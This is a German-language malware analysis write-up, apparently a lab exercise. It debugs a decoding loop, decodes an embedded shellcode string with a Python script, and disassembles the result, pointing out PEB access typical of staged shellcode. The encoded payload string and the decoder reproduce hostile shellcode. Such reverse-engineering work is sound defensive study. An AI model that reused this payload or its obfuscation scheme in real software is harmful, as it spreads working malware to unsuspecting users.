1. Das EIP (Entry Instruction Pointer) wurde manuell auf die Adresse 0x00401000 gesetzt.

2. Wir haben mehrmals den Befehl "Step Over" verwendet, bis wir die Adresse 0x00401037 erreicht haben.
➤ Was sich geändert hat:
Der Funktionsname wurde manuell zu "CreateFileA" umbenannt, um die Lesbarkeit und Analyse zu erleichtern.
Der Wert von EAX hat sich von 0x00000000 auf 0x000000EC geändert.

3. Wir haben weiterhin den Befehl "Step Over" ausgeführt, bis wir die Adresse 0x0040105E erreicht haben. Dort blieb die Ausführung jedoch blockiert und konnte nicht fortgesetzt werden. Erst nachdem im Speicher vollständiger Zugriff (Full Access) auf die Adresse 0x0040105E gewährt wurde, konnte die Analyse mit dem nächsten Schritt fortgesetzt werden.
➤ Was sich geändert hat:
EAX = 0x00000CB5 ⇒ AL = 0xB5 (niedrigstes Byte von AX)
Wert 0xB5 wurde in den Speicher geschrieben
EDI = 0x00401069 (Zieladresse)
ESI = 0x0040106A (Quelladresse oder nächste Instruktion)
ECX = 0x017C (380 dezimal)

4.Wir haben weiterhin den Befehl "Step Over" verwendet, bis wir erneut die Adresse 0x0040105E erreicht haben, an der die Instruktion "STOSB" (AA) ausgeführt wurde. STOSB speichert ein Byte aus dem Register AL in eine bestimmte Speicheradresse.

Die Adresse 0x0040105E befindet sich innerhalb einer Schleife, die wie folgt aufgebaut ist:

```
0040104C | AC            | LODSB         ; lädt ein Byte von [ESI] in AL
0040104D | 66:2D 6100    | SUB AX, 0x61  ; Subtrahiert 0x61 von AX
00401051 | 66:C1E0 04    | SHL AX, 4     ; Shiftet AX um 4 Bit nach links
00401055 | 66:8BD0       | MOV DX, AX    ; Kopiert AX nach DX
00401058 | AC            | LODSB         ; Lädt nächstes Byte in AL
00401059 | 2C 61         | SUB AL, 0x61  ; Subtrahiert 0x61 von AL
0040105B | 66:03C2       | ADD AX, DX    ; Addiert DX zu AX
0040105E | AA            | STOSB         ; Speichert AL in [EDI]
0040105F | 49            | DEC ECX       ; Dekrementiert ECX
00401060 | 75 EA         | JNE 0040104C  ; Springt zurück, wenn ECX ≠ 0
```

Die Schleife liest bei jeder Iteration zwei kodierte Zeichen, wandelt sie in einen binären Wert (4 Bit + 4 Bit) um, und schreibt das resultierende Byte in einen Speicherpuffer.
Dieser Vorgang wird 380 Mal wiederholt (ECX = 0x017C), um ein Payload aus 760 Zeichen zu rekonstruieren.

5. Wir haben weiterhin "Step Over" verwendet, bis wir die Adresse 0x0040106A erreicht haben. Dort wurde die Instruktion "IN AL, DX" (Opcode: EC) ausgeführt.

Die Instruktion "IN AL, DX" liest ein Byte von einem I/O-Port, dessen Adresse im Register DX gespeichert ist, und speichert es im Register AL.

Um zu analysieren, worauf genau diese Instruktion zugreift, haben wir die verschlüsselte Zeichenkette ab der Adresse ESI = 0x0040106A extrahiert und mit einem Python-Skript entschlüsselt.

Das verwendete Python-Skript:

```python
encoded = "Yl_mYd_mfmfdfgfh]hef`abbaaaaaa_jboabaaaaYpef`mge[bdaaaaaaaYleaamYlhabm[nYlfiaiYjfn_mYlen`aYlhn`mfbYlef_mYlhadmYlheaghiad`afgYlhgcaad`add]jejeb[nadef_mdd^lap\\\\obadk^gheai]b]lanad^kea_l`bdlbphf_gfoYlfoceadfn_mggYlamelYlfobmadfn_mYlaeYladef_m[lfj_c\\\\fdd]aYjef_iYjef_eYdef_eaegkaaYlef_efaYlen`m`pfbbaYjef`eYdhn`e`phegnYbhn`eaacaaaaahnac_lgcgkeagiaabaaaaaYlff`efcgkaaYlef`m`pfadeYjef`igkaagkaagkaaYlen_efbYlff`m`pfcdagkaaYnef_ifaYlen`efbYlff`ifcYlef_efaYlen`m`pfbcmYlff`iadff`eYbhk`mgfgpggakhfac_lcagiaaYaaaaaYle"

data = [ord(c) for c in encoded]

def decrypt(data):
    decrypted = bytearray()
    i = 0
    while i < len(data) - 1:
        a = data[i]
        b = data[i + 1]
        val = ((a - 0x61) << 4) + (b - 0x61)
        decrypted.append(val & 0xFF) 
        i += 2
    return decrypted

decrypted_bytes = decrypt(data)

with open("decrypted_output.bin", "wb") as f:
    f.write(decrypted_bytes)
```

Das Skript generierte die Datei decrypted_output.bin, welche den entschlüsselten Shellcode enthält, der ursprünglich an der Adresse ESI = 0040106A gespeichert war.

Wir haben dann das Tool ndisasm verwendet, um diesen Binärcode zu disassemblieren. Das hat uns ermöglicht, die genaue Funktion der IN AL, DX-Instruktion zu erkennen. Die Ausgabe war wie folgt:
```asm
00000000  8BEC              mov bp,sp
00000002  83EC5C            sub sp,byte +0x5c
00000005  53                push bx
00000006  56                push si
00000007  57                push di
00000008  C745F01100        mov word [di-0x10],0x11
0000000D  0000              add [bx+si],al
0000000F  E91E01            jmp 0x130
00000012  0000              add [bx+si],al
00000014  8F45FC            pop word [di-0x4]
00000017  64A13000          mov ax,[fs:0x30]
0000001B  0000              add [bx+si],al
0000001D  8B400C            mov ax,[bx+si+0xc]
00000020  8B701C            mov si,[bx+si+0x1c]
00000023  AD                lodsw
00000024  8B5808            mov bx,[bx+si+0x8]
00000027  895DEC            mov [di-0x14],bx
0000002A  8B4DF0            mov cx,[di-0x10]
0000002D  8B7DFC            mov di,[di-0x4]
00000030  51                push cx
00000031  8B45EC            mov ax,[di-0x14]
00000034  8B703C            mov si,[bx+si+0x3c]
00000037  8B7406            mov si,[si+0x6]
0000003A  7803              js 0x3f
0000003C  F056              lock push si
0000003E  8B7620            mov si,[bp+0x20]
00000041  03F0              add si,ax
00000043  33C9              xor cx,cx
00000045  49                dec cx
00000046  41                inc cx
00000047  AD                lodsw
00000048  0345EC            add ax,[di-0x14]
0000004B  33DB              xor bx,bx
0000004D  0FABE1            bts cx,sp
00000050  039D6740          add bx,[di+0x4067]
00000054  7C0C              jl 0x62
00000056  B0D0              mov al,0xd0
00000058  2DA4FE            sub ax,0xfea4
0000005B  AF                scasw
0000005C  13B1F74E          adc si,[bx+di+0x4ef7]
00000060  65D8B5E240        fdiv dword [gs:di+0x40e2]
00000065  35CEC6            xor ax,0xc6ce
00000068  58                pop ax
00000069  B0C4              mov al,0xc4
0000006B  A8B5              test al,0xb5
0000006D  E1C0              loope 0x2f
0000006F  35CEB8            xor ax,0xb8ce
00000072  B038              mov al,0x38
00000074  B034              mov al,0x34
00000076  4E                dec si
00000077  BAB58E            mov dx,0x8eb5
0000007A  1BB533C0          sbb si,[di-0x3fcd]
0000007E  8945E8            mov [di-0x18],ax
00000081  8945E4            mov [di-0x1c],ax
00000084  8345E404          add word [di-0x1c],byte +0x4
00000088  6A00              push byte +0x0
0000008A  8B45E4            mov ax,[di-0x1c]
0000008D  50                push ax
0000008E  8B4DFC            mov cx,[di-0x4]
00000091  FF5110            call [bx+di+0x10]
00000094  8945F4            mov [di-0xc],ax
00000097  837DF4FF          cmp word [di-0xc],byte -0x1
0000009B  746D              jz 0x10a
0000009D  817DF40020        cmp word [di-0xc],0x2000
000000A2  0000              add [bx+si],al
000000A4  7D02              jnl 0xa8
000000A6  EB62              jmp short 0x10a
000000A8  6A40              push byte +0x40
000000AA  680010            push word 0x1000
000000AD  0000              add [bx+si],al
000000AF  8B55F4            mov dx,[di-0xc]
000000B2  52                push dx
000000B3  6A00              push byte +0x0
000000B5  8B45FC            mov ax,[di-0x4]
000000B8  FF5034            call [bx+si+0x34]
000000BB  8945F8            mov [di-0x8],ax
000000BE  6A00              push byte +0x0
000000C0  6A00              push byte +0x0
000000C2  6A00              push byte +0x0
000000C4  8B4DE4            mov cx,[di-0x1c]
000000C7  51                push cx
000000C8  8B55FC            mov dx,[di-0x4]
000000CB  FF5230            call [bp+si+0x30]
000000CE  6A00              push byte +0x0
000000D0  8D45E8            lea ax,[di-0x18]
000000D3  50                push ax
000000D4  8B4DF4            mov cx,[di-0xc]
000000D7  51                push cx
000000D8  8B55F8            mov dx,[di-0x8]
000000DB  52                push dx
000000DC  8B45E4            mov ax,[di-0x1c]
000000DF  50                push ax
000000E0  8B4DFC            mov cx,[di-0x4]
000000E3  FF512C            call [bx+di+0x2c]
000000E6  8B55F8            mov dx,[di-0x8]
000000E9  0355F4            add dx,[di-0xc]
000000EC  817AFC656F        cmp word [bp+si-0x4],0x6f65
000000F1  660A7502          o32 or dh,[di+0x2]
000000F5  EB20              jmp short 0x117
000000F7  680080            push word 0x8000
000000FA  0000              add [bx+si],al
000000FC  8B                db 0x8b
```

Die Instruktion MOV EAX, FS:[0x30], die wir bei Adresse 0x00000017 gefunden haben, zeigt, dass der Shellcode versucht, auf den Process Environment Block, also den PEB, zuzugreifen.
Das ist bei vielen Shellcodes ganz typisch – sie holen sich damit Infos über den Prozess, zum Beispiel wo genau die wichtigen DLLs wie kernel32.dll im Speicher liegen.
Danach werden Funktionen wie LoadLibrary oder GetProcAddress verwendet, um weitere Funktionen zu laden. So kann der Shellcode seine eigentliche Payload nach und nach ausführen – also genau das, was man bei einem staged Shellcode erwartet.
